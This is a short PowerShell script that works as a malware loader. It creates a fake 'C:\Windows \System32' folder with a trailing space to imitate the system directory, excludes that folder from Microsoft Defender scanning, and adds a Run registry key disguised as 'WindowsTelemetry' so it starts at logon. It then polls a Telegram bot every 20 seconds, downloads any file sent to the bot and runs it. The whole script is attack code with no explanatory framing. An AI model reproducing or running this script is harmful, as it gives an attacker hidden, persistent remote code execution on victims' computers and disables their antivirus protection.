$ErrorActionPreference = "SilentlyContinue"

$botToken = $env:BOT_TOKEN
$stage = 'C:\Windows \System32'
$payload = "$stage\telemetry.exe"
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

New-Item -ItemType Directory -Path $stage -Force | Out-Null
Add-MpPreference -ExclusionPath $stage
New-ItemProperty -Path $runKey -Name 'WindowsTelemetry' -Value 'C:\Windows \System32\telemetry.exe' -PropertyType String -Force | Out-Null

while ($true) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates"
    foreach ($update in $updates.result) {
        if ($update.message.document.file_id) {
            $fileId = $update.message.document.file_id
            $metadata = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getFile?file_id=$fileId"
            $remotePath = $metadata.result.file_path
            Invoke-WebRequest -Uri "https://api.telegram.org/file/bot$botToken/$remotePath" -OutFile $payload
            Start-Process -FilePath $payload 
        }
    }
    Start-Sleep -Seconds 20
}
